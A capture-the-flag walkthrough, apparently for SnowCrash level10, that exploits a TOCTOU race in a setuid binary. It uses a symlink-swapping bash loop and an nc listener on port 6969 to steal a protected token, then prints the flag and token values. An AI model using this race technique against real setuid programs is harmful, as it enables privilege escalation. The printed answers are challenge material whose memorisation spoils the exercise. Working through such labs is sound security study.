FLAG: s5cAJpM8ev6XHw998pRWG728z

 > ls -l
'''
    total 16
    -rwsr-sr-x+ 1 flag10 level10 10817 Mar  5  2016 level10
    -rw-------  1 flag10 flag10     26 Mar  5  2016 token
'''

 > ./level10
'''
    ./level10 file host
            sends file to host if you have access to it
'''

 > ./level10 token 127.0.0.1
'''
    You don't have access to token
'''

 > echo "Hey" > /tmp/test10
 > ./level10 /tmp/test10 127.0.0.1
'''
    Connecting to localhost:6969 .. Unable to connect to host localhost
'''

 > ltrace ./level10 /tmp/test10 127.0.0.1
'''
    __libc_start_main(0x80486d4, 3, 0xbffff7d4, 0x8048970, 0x80489e0 <unfinished ...>
    access("/tmp/test10", 4)                                                                     = 0
    printf("Connecting to %s:6969 .. ", "localhost")                                             = 32
    fflush(0xb7fd1a20Connecting to localhost:6969 .. )                                                                           = 0
    socket(2, 1, 0)                                                                              = 3
    inet_addr("localhost")                                                                       = 0xffffffff
    htons(6969, 1, 0, 0, 0)                                                                      = 14619
    connect(3, 0xbffff71c, 16, 0, 0)                                                             = -1
    printf("Unable to connect to host %s\n", "localhost"Unable to connect to host localhost
    )                                        = 36
    exit(1 <unfinished ...>
    +++ exited (status 1) +++
'''

 > nm -u level10
'''
    w _Jv_RegisterClasses
    U __errno_location@@GLIBC_2.0
    w __gmon_start__
    U __libc_start_main@@GLIBC_2.0
    U __stack_chk_fail@@GLIBC_2.4
    U access@@GLIBC_2.0
    U connect@@GLIBC_2.0
    U exit@@GLIBC_2.0
    U fflush@@GLIBC_2.0
    U htons@@GLIBC_2.0
    U inet_addr@@GLIBC_2.0
    U open@@GLIBC_2.0
    U printf@@GLIBC_2.0
    U puts@@GLIBC_2.0
    U read@@GLIBC_2.0
    U socket@@GLIBC_2.0
    U strerror@@GLIBC_2.0
    U write@@GLIBC_2.0
'''

 > man access
'''
    Warning: Using access() to check if a user is authorized to, for example, open a file before actually doing so using open(2) creates a secu‐
    rity hole, because the user might exploit the short time interval between checking and opening the file to manipulate it.  For this  reason,
    the  use  of  this  system  call  should be avoided.  (In the example just described, a safer alternative would be to temporarily switch the
    process's effective user ID to the real ID and then call open(2).)
'''

TOCTOU = Time-of-check to time-of-use

 > vi /tmp/toctou.sh
'''
#!/bin/bash

echo " ( Test 10 ) " > /tmp/10_linked

while true
do
        ln -sf /tmp/10_linked /tmp/10_symlink
        ln -sf /home/user/level10/token /tmp/10_symlink
done
'''
 > chmod +x /tmp/toctou.sh
 > /tmp/toctou.sh &
 > nc -lk 6969 | grep -v ".*( )*." &
 > while true; do ./level10 /tmp/10_symlink 127.0.0.1; done &>/dev/null
'''
    woupa2yuojeeaaed06riuj63c
'''

Kill process for the sake of it
 > ps 
 > kill PID

 > su flag10
 > getflag
'''
    feulo4b72j7edeahuete3no7c
'''
